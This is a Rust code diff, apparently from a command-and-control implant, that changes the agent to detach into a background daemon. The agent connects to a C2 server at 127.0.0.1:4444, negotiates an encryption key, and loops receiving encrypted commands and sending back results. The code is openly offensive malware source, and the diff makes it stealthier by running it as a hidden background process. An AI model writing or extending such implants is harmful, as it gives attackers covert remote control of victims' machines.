@@ -11,8 +11,8 @@ use comms::{Payload, recv_data, intro};
 mod encryption;
 use encryption::{custom_decrypt, custom_encrypt};
 use std::process::Command;
-
-
+use fork::{daemon, Fork};
+use tokio::runtime::Runtime;
 
 async fn create_payload(stream: &mut TcpStream, key: &secretbox::Key) -> Payload{
     let buff: Vec<u8> = recv_data(stream).await;
@@ -38,15 +38,17 @@ async fn connect_c2(address: &str) -> io::Result<TcpStream>{
     Ok(stream)
 }
 
-#[tokio::main]
-async fn main() -> io::Result<()> {
+fn start() {
     //connect to c2
-    let mut stream: TcpStream = connect_c2("127.0.0.1:4444").await.unwrap();
-    println!("Connected!");
     
+    if let Ok(Fork::Child) = daemon(true, false) {
+    
+        let rt = Runtime::new().unwrap();
+    rt.block_on(async{
+    
+        let mut stream: TcpStream = connect_c2("127.0.0.1:4444").await.unwrap();
     //do intro msg to get our key we will use for encrypt/decrypt
-    let key:secretbox::Key = intro(&mut stream).await?;
-    
+    let key:secretbox::Key = intro(&mut stream).await.unwrap();
     loop {
         //We are processing the data and turning it into our payload struct`~
         let data: Payload = create_payload(&mut stream, &key).await;
@@ -55,6 +57,16 @@ async fn main() -> io::Result<()> {
         //send the result
         send_payload(&mut stream, &key, &msg).await;
         
+        }
+        });
     }
 }
+
+fn main() -> io::Result<()> {
+    
+        start();
+    
+Ok(())
+}
+
 
